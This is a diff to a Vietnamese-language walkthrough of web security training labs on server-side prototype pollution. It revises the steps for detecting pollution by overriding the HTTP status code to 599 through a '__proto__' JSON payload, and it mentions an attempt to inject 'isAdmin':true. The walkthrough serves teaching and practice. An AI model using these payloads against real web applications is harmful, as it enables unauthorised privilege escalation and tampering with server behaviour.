@@ -113,9 +113,21 @@ Nhận thấy trong response có `"isAdmin":false`. Khi đó, ta hoàn toàn có
 # 7. Detecting server-side prototype pollution without polluted property reflection
 Đăng nhập với credentials wiener:peter, ta thấy request `POST /my-account/change-address` nhận vào một chuỗi JSON và trả về JSON trong response. 
 
-Nhận thấy, khi submit với tham số `country` không hợp lệ, response sẽ trả về lỗi.
+Trong chức năng change address, submit request với body chứa đoạn JSON không hợp lệ (ví dụ `"country"y:"UK"`), thì ta thấy response trả về một chuỗi JSON error:
+```
+{
+    "error":
+    {
+        "expose":true,
+        "statusCode":400,
+        "status":400,
+        "body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"Osne Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\"y:\"UK\",\"sessionId\":\"sKIM2HlzOKKv5yafMtouqZ9U7mLE1TdW\"}",
+        "type":"entity.parse.failed"
+    }
+}
+```
 
-Để exploit prototype pollution với status code, ta thử cấu hình phần body như sau:
+Thử exploit prototype pollution bằng cách ghi đè status code, ta cấu hình phần body như sau:
 ```
 {
     "address_line_1":"Wiener HQ",
@@ -126,14 +138,11 @@ Nhận thấy, khi submit với tham số `country` không hợp lệ, response 
     "sessionId":"cgYDvt1jgVprQ1RMlbmtAwUCj6qLCfeK",
     "__proto__":
     {
-        "__proto__":
-        {
-            "status":599
-        }
+        "status":599
     }
 }
 ```
-Sau khi submit, kết quả trả về bình thường. Tiếp đó ta thử submit một response lỗi, nhận thấy status code là 599. Như vậy, ta detect được website có lỗi prototype pollution, bài lab được giải.
+Submit request trên. Sau đó, ta thử submit một request không hợp lệ, nhận thấy status code là 599. Như vậy, ta detect được website có lỗi prototype pollution, bài lab được giải.
 
 # 8. Bypassing flawed input filters for server-side prototype pollution
 Đăng nhập với credentials wiener:peter, nhận thấy trong chức năng thay đổi address, response có reflect lại các tham số trong request. Ta thử exploit bằng cách thêm `"__proto__":{"isAdmin":true}` nhưng không thành công.
